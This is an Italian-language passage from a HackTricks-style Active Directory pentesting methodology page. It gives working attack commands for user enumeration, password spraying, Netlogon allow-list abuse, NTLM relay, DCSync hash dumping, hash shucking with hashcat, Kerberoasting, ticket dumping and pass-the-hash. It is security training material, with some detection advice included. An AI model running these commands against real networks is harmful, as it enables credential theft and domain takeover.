# Metodologia di Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** è una tecnologia fondamentale che consente agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per essere scalabile e facilita l'organizzazione di un numero elevato di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **alberi** e **foreste**. Un **dominio** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. Gli **alberi** sono gruppi di questi domini collegati da una struttura condivisa, mentre una **foresta** rappresenta la raccolta di più alberi, interconnessi tramite **relazioni di trust**, formando il livello più alto della struttura organizzativa. Specifici **diritti di accesso** e di **comunicazione** possono essere assegnati a ciascuno di questi livelli.

I concetti chiave all'interno di **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica le entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Domain** – Funge da contenitore per gli oggetti della directory; più domini possono coesistere all'interno di una **foresta**, mantenendo ciascuno la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domini che condividono un dominio radice comune.
5. **Forest** – Il vertice della struttura organizzativa in Active Directory, composto da diversi alberi con **relazioni di trust** tra loro.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, comprese le funzionalità di **autenticazione** e **ricerca**.
2. **Certificate Services** – Gestisce la creazione, la distribuzione e la gestione di **certificati digitali** sicuri.
3. **Lightweight Directory Services** – Supporta le applicazioni abilitate per le directory tramite il **protocollo LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single sign-on** per autenticare gli utenti su più applicazioni web in un'unica sessione.
5. **Rights Management** – Contribuisce a proteggere i materiali coperti da copyright regolamentandone la distribuzione e l'utilizzo non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **nomi di dominio**.

Per una spiegazione più dettagliata, consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Autenticazione Kerberos**

Per imparare ad **attaccare un AD** è necessario **comprendere** molto bene il **processo di autenticazione Kerberos**.\
[**Leggi questa pagina se non sai ancora come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi consultare [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una rapida panoramica dei comandi che puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> La comunicazione Kerberos normalmente **richiede un fully qualified domain name (FQDN)** affinché il client possa ottenere un ticket per lo SPN corretto. L'accesso a una macchina tramite indirizzo IP ricade comunemente su NTLM invece che su Kerberos.

## Recon Active Directory (senza credenziali/sessioni)

Se hai accesso a un ambiente AD ma non possiedi credenziali/sessioni, potresti:

- **Fare il Pentest della rete:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **sfruttare le vulnerabilità** o **estrarre credenziali** da esse (ad esempio, [le stampanti possono essere target molto interessanti](ad-information-in-printers.md)).
- L'enumerazione del DNS potrebbe fornire informazioni sui server principali del dominio, come web, stampanti, share, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la [**Metodologia di Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) generale per ulteriori informazioni su come farlo.
- **Verificare l'accesso null e Guest sui servizi smb** (non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Qui è disponibile una guida più dettagliata su come enumerare un server SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerare LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Qui è disponibile una guida più dettagliata su come enumerare LDAP (presta **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Avvelenare la rete**
- Raccogliere credenziali [**impersonando servizi con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedere all'host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**servizi UPnP falsi con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre username/nomi da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti del dominio e anche da fonti pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti dell'azienda, puoi provare diverse **convenzioni per gli username AD (**[**leggi qui**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere per ciascun nome), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Tool:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione degli utenti

- **Enumerazione SMB/LDAP anonima:** consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumerazione con Kerbrute**: quando viene richiesto uno **username non valido**, il server risponde utilizzando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, consentendoci di determinare che lo username non è valido. Gli **username validi** genereranno una risposta contenente il **TGT** in un **AS-REP** oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-autenticazione.
- **Nessuna autenticazione tramite MS-NRPC**: utilizzo di auth-level = 1 (nessuna autenticazione) sull'interfaccia MS-NRPC (Netlogon) dei domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo il binding all'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Il tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca è disponibile [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Server OWA (Outlook Web Access)**

Se hai trovato uno di questi server nella rete, puoi anche eseguire la **user enumeration** su di esso. Ad esempio, potresti usare il tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare elenchi di username in [**questo repository GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in quest'altro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere i **nomi delle persone che lavorano nell'azienda** ottenuti durante la fase di recon che dovresti aver eseguito in precedenza. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali username validi.

### Abuso della allow-list dei canali vulnerabili Netlogon (Onelogon)

Anche dopo l'applicazione della patch per **Zerologon** sul DC, gli account esplicitamente presenti nella allow-list possono ancora essere esposti al comportamento **legacy/vulnerable dei secure channel Netlogon**. La configurazione rischiosa è la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o il valore di registro corrispondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Quel valore è un **security descriptor SDDL** (vedi [Security Descriptors](security-descriptors.md)). Qualsiasi account o gruppo a cui è stato concesso l'ACE pertinente nella DACL può essere preso di mira. Ad esempio, `O:BAG:BAD:(A;;RC;;;WD)` inserisce di fatto **Everyone** nella allow-list.

Workflow operativo pratico:

1. **Identifica i principal presenti nella allow-list** controllando sia **SYSVOL/GPO** sia il **registro live del DC**.
2. **Risolvi i SID** trovati nell'SDDL in utenti/computer AD reali e assegna la priorità agli **account macchina dei DC**, agli **account di trust** e alle altre macchine privilegiate.
3. Tenta ripetutamente l'**autenticazione MS-NRPC / Netlogon** usando l'account presente nella allow-list.
4. Dopo un tentativo riuscito, abusa della funzionalità **Netlogon password-setting** per reimpostare la password dell'account target (il PoC pubblico la imposta su una stringa vuota).<sup>[[9]](#references)[[10]](#references)</sup>

Esempi rapidi di triage / lab tratti dall'artefatto pubblico:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Note:

- Lo **scanner** è utile perché l’allow-list effettiva può trovarsi in **SYSVOL**, nel **registry** o in entrambi.
- Il percorso di exploit è importante perché **non richiede privilegi Domain Admin** una volta identificato un account vulnerabile.
- Compromettere un **Domain Controller machine account** come `DC$` è particolarmente pericoloso, perché il reset della relativa password può abilitare direttamente percorsi più ampi di **AD takeover**.
- La fattibilità del **brute-force** dipende dalla modalità: l’artifact pubblico descrive un approccio meet-in-the-middle, un **brute force a 24 bit** quando è disponibile un altro computer account e varianti **a 32 bit** più lente.

Note su detection / hardening:

- Esegui l’audit della policy dell’allow-list e rimuovi tutto ciò che non sia un’eccezione temporanea e esplicitamente necessaria per la compatibilità.
- Monitora gli eventi **System** dei DC **5827/5828/5829/5830/5831** per rilevare connessioni Netlogon vulnerabili negate, individuate o esplicitamente consentite dalla policy.
- Considera gli account presenti in `VulnerableChannelAllowList` come **ad alto rischio** finché la dipendenza legacy non viene rimossa.

### Conoscere uno o più username

Ok, quindi sai di avere già uno username valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): se un utente **non possiede** l'attributo _DONT_REQ_PREAUTH_, puoi **richiedere un messaggio AS_REP** per quell'utente, che conterrà alcuni dati cifrati tramite una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): proviamo le password più **comuni** con ciascuno degli utenti individuati; magari qualche utente sta usando una password debole (tieni presente la password policy!).
- Nota che puoi anche fare **spraying sui server OWA** per tentare di ottenere accesso ai mail server degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti riuscire a **ottenere** alcuni **hash** di challenge effettuando il **poisoning** di alcuni protocolli della **rete**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

L'enumerazione di Active Directory fornisce username, identificativi email e pattern di denominazione, host candidati e servizi che possono essere indotti ad autenticarsi. Usa questo contesto per identificare possibili [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM e potenziali percorsi verso l'ambiente AD.

### NetExec: ricognizione basata sui workspace e controlli della postura di relay

- Usa i **workspace `nxcdb`** per mantenere lo stato della ricognizione AD separato per ogni engagement: `workspace create <name>` genera database SQLite separati per protocollo in `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` ed elenca i secret raccolti con `creds`. Elimina manualmente i dati sensibili al termine: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La discovery rapida della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono il signing.
- Genera gli **hostname in /etc/hosts** direttamente dall'output di NetExec per semplificare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando il **SMB relay verso il DC è bloccato** dalla firma, verifica comunque lo stato di **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / un channel binding debole. Un DC con la firma SMB obbligatoria ma la firma LDAP disabilitata rimane un target valido per **relay-to-LDAP**, per abusi come **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Le interfacce **web** delle stampanti a volte **includono password admin mascherate nell'HTML**. Visualizzare il codice sorgente o usare gli strumenti per sviluppatori può rivelare il testo in chiaro (ad es., `<input value="<password>">`), consentendo l'accesso Basic-auth ai repository di scansione/stampa.
- I print job recuperati possono contenere **documenti di onboarding in plaintext** con password per utente. Mantieni gli abbinamenti allineati durante i test:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Rubare credenziali NTLM

Se puoi **accedere ad altri PC o condivisioni** con l'utente **null o guest**, potresti **posizionare file** (come un file SCF) che, se in qualche modo aperti, **attiveranno un'autenticazione NTLM verso di te**, permettendoti di **rubare** la **challenge NTLM** per sottoporla a cracking:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking e attacchi NT-Candidate

**Hash shucking** tratta ogni hash NT già in tuo possesso come una password candidata per altri formati più lenti il cui materiale delle chiavi deriva direttamente dall'hash NT. Invece di eseguire il brute-force di passphrase lunghe nei ticket Kerberos RC4, nelle challenge NetNTLM o nelle credenziali cached, fornisci gli hash NT alle modalità NT-candidate di Hashcat e lasci che validi il riutilizzo della password senza dover mai conoscere il plaintext. Questa tecnica è particolarmente efficace dopo una compromissione del dominio, quando puoi raccogliere migliaia di hash NT attuali e storici.<sup>[[5]](#references)</sup>

Usa lo shucking quando:

- Hai un corpus NT ottenuto da DCSync, dump SAM/SECURITY o credential vault e devi verificare il riutilizzo in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riutilizzo di passphrase lunghe e non crackabili, per poi effettuare immediatamente un pivot tramite Pass-the-Hash.

La tecnica **non funziona** contro i tipi di cifratura le cui chiavi non sono l'hash NT (ad esempio Kerberos etype 17/18 AES). Se un dominio impone esclusivamente AES, devi tornare alle normali modalità basate sulla password.

#### Creazione di un corpus di hash NT

- **DCSync/NTDS** – Usa `secretsdump.py` con la history per ottenere il maggior numero possibile di hash NT (e dei relativi valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci della history ampliano notevolmente il pool dei candidati, perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere i secret NTDS, vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump della cache degli endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oppure Mimikatz `lsadump::sam /patch`) estrae i dati SAM/SECURITY locali e i logon di dominio cached (DCC/DCC2). Rimuovi i duplicati e aggiungi questi hash alla stessa lista `nt_candidates.txt`.
- **Tieni traccia dei metadata** – Conserva il nome utente/dominio che ha prodotto ogni hash (anche se la wordlist contiene solo valori esadecimali). Gli hash corrispondenti indicano immediatamente quale principal sta riutilizzando una password quando Hashcat stampa il candidato vincente.
- Preferisci candidati della stessa foresta o di una foresta trusted; ciò massimizza la probabilità di sovrapposizione durante lo shucking.

#### Modalità NT-candidate di Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Note:

- Gli input NT-candidate **devono rimanere hash NT raw da 32 caratteri esadecimali**. Disabilita i rule engine (nessun `-r`, nessuna modalità ibrida), perché il mangling corrompe il materiale della chiave candidata.
- Queste modalità non sono intrinsecamente più veloci, ma il keyspace NTLM (~30.000 MH/s su un M3 Max) è circa 100 volte più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto meno costoso che esplorare l'intero spazio delle password nel formato lento.
- Esegui sempre la **build più recente di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), perché le modalità 31500/31600/35300/35400 sono state aggiunte di recente.<sup>[[7]](#references)</sup>
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, mentre gli etype AES (19600/19700) richiedono la password in plaintext, perché le relative chiavi vengono derivate tramite PBKDF2 da password UTF-16LE e non da hash NT raw.

#### Esempio – Kerberoast RC4 (modalità 35300)

1. Cattura un TGS RC4 per uno SPN target con un utente low-privileged (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Esegui lo shuck del ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che il service account utilizza uno degli hash NT già in tuo possesso.

3. Effettua immediatamente un pivot tramite PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Facoltativamente, puoi recuperare in seguito il plaintext con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Esempio – Credenziali cached (modalità 31600)

1. Esegui il dump dei logon cached da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 dell'utente del dominio interessante in `dcc2_highpriv.txt` ed esegui lo shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'hash NT già noto nella tua lista, dimostrando che l'utente cached sta riutilizzando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure sottoponilo a brute-force nella modalità NTLM veloce per recuperare la stringa.

Lo stesso workflow si applica alle challenge-response NetNTLM (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificata una corrispondenza, puoi avviare relay, PtH tramite SMB/WMI/WinRM oppure sottoporre nuovamente l'hash NT a cracking offline con mask/rule.



## Enumerazione di Active Directory CON credenziali/sessione

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido**. Se disponi di credenziali valide o di una shell come utente di dominio, **dovresti ricordare che le opzioni indicate in precedenza restano comunque utilizzabili per compromettere altri utenti**.

Prima di iniziare l'enumerazione autenticata, comprendi il **problema del double-hop di Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerazione

Compromettere un account rappresenta un **passo importante verso la valutazione del dominio**, perché abilita l'**enumerazione autenticata di Active Directory**:

Per quanto riguarda [**ASREPRoast**](asreproast.md), ora puoi trovare ogni possibile utente vulnerabile; per quanto riguarda il [**Password Spraying**](password-spraying.md), puoi ottenere un **elenco di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Puoi usare il [**CMD per eseguire una recon di base**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell per la recon**](../basic-powershell-for-pentesters/index.html), che sarà più stealthy
- Puoi anche [**usare powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro strumento eccezionale per la recon in un Active Directory è [**BloodHound**](bloodhound.md). È **poco stealthy** (a seconda dei metodi di collection utilizzati), ma **se non ti interessa**, dovresti assolutamente provarlo. Trova dove gli utenti possono eseguire RDP, individua i percorsi verso altri gruppi, ecc.
- **Altri strumenti automatizzati per l'enumerazione AD sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Record DNS dell'AD**](ad-dns-records.md), perché potrebbero contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe**, incluso nella suite **SysInternal**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per individuare credenziali nei campi _userPassword_ e _unixUserPassword_, o anche in _Description_. Vedi [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se usi **Linux**, puoi anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Puoi anche provare strumenti automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Estrazione di tutti gli utenti del dominio**

È molto semplice ottenere tutti gli username del dominio da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oppure `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione sull'enumerazione può sembrare breve, è la parte più importante di tutte. Accedi ai link (soprattutto quelli relativi a cmd, powershell, powerview e BloodHound), impara a enumerare un dominio e fai pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento fondamentale per trovare il percorso verso DA o per decidere che non è possibile fare altro.

### Kerberoast

Il Kerberoasting consiste nell'ottenere **ticket TGS** utilizzati dai servizi associati agli account utente e nel sottoporre il loro algoritmo di cifratura, basato sulle password degli utenti, a cracking **offline**.

Maggiori informazioni qui:


{{#ref}}
kerberoast.md
{{#endref}}

### Connessione remota (RDP, SSH, FTP, Win-RM, ecc.)

Una volta ottenute alcune credenziali, puoi verificare se hai accesso a una **macchina**. A questo scopo, puoi usare **CrackMapExec** per tentare la connessione a diversi server tramite protocolli differenti, in base alle scansioni delle porte.

### Privilege Escalation locale

Se hai compromesso credenziali o una sessione come utente di dominio standard e puoi accedere a **una qualsiasi macchina del dominio**, cerca un percorso per **effettuare privilege escalation localmente e raccogliere credenziali**. I privilegi di amministratore locale possono consentirti di **eseguire il dump degli hash di altri utenti** dalla memoria (LSASS) e dall'archiviazione locale (SAM).

In questo libro è disponibile una pagina completa sulla [**privilege escalation locale in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Ticket della sessione corrente

È molto **improbabile** trovare **ticket** nell'utente corrente che ti **concedano il permesso di accedere** a risorse inaspettate, ma puoi verificare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Con credenziali di dominio o una sessione utente, riesamina gli [**attacchi di relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: le tecniche di enumerazione autenticata e coercizione possono esporre percorsi di relay che non erano disponibili durante la ricognizione non autenticata.

### Ricerca di Creds nelle condivisioni dei computer | Condivisioni SMB

Ora che disponi di alcune credenziali di base, dovresti verificare se riesci a **trovare** **file interessanti condivisi all'interno dell'AD**. Potresti farlo manualmente, ma è un'attività molto noiosa e ripetitiva (soprattutto se trovi centinaia di documenti da controllare).

[**Segui questo link per scoprire quali tool puoi utilizzare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o condivisioni**, potresti **posizionare file** (come un file SCF) che, se in qualche modo venissero aperti, **attiverebbero un'autenticazione NTLM verso di te**, permettendoti di **rubare** la **NTLM challenge** per sottoporla a cracking:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation su Active Directory CON credenziali/sessione privilegiata

**Per le tecniche seguenti un normale utente di dominio non è sufficiente: sono necessari privilegi/credenziali speciali per eseguire questi attacchi.**

### Estrazione degli hash

Si spera che tu sia riuscito a **compromettere qualche account di amministratore locale** utilizzando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluso il relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [l'escalation dei privilegi in locale](../windows-local-privilege-escalation/index.html).\
A questo punto è il momento di eseguire il dump di tutti gli hash presenti in memoria e localmente.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta ottenuto l'hash di un utente**, puoi utilizzarlo per **impersonarlo**.\
Devi utilizzare un **tool** che **esegua** l'**autenticazione NTLM utilizzando** quell'**hash**, **oppure** puoi creare una nuova **sessionlogon** e **iniettare** quell'**hash** all'interno di **LSASS**, in modo che, quando viene eseguita un'autenticazione **NTLM**, venga utilizzato quell'**hash**. L'ultima opzione è quella utilizzata da mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **utilizzare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Pertanto, ciò può essere particolarmente **utile nelle reti in cui il protocollo NTLM è disabilitato** e come protocollo di autenticazione è consentito soltanto **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli aggressori **rubano il ticket di autenticazione di un utente** invece della sua password o dei suoi valori hash. Questo ticket rubato viene quindi utilizzato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Riutilizzo delle credenziali

Se disponi dell'**hash** o della **password** di un **amministrato**r locale, dovresti provare a **effettuare il login localmente** su altri **PC** utilizzandoli.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente dispone dei privilegi per **accedere alle istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull'host MSSQL (se eseguito come SA), **rubare** l'**hash** NetNTLM o persino eseguire un'**attack** di **relay**.\
Se un'istanza MSSQL è considerata attendibile tramite un collegamento al database da parte di un'altra istanza, un utente con privilegi sul database collegato potrebbe essere in grado di **usare la relazione di trust per eseguire query sull'altra istanza**. Queste relazioni di trust possono essere concatenate e potrebbero eventualmente raggiungere un database configurato in modo errato, dove l'utente può eseguire comandi.\
**I collegamenti tra database funzionano anche tra forest trust.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

